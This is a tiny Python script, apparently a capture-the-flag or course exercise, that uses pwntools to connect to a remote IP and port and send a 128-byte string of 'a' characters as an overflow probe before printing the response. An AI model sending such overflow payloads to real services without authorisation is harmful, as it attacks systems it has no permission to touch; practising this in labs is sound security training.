from pwn import *

r = remote("140.113.207.245", 30170)
print(r.recv().decode())
payload = "a" * 128
r.sendline(payload.encode())
print(r.recv().decode())
r.close()
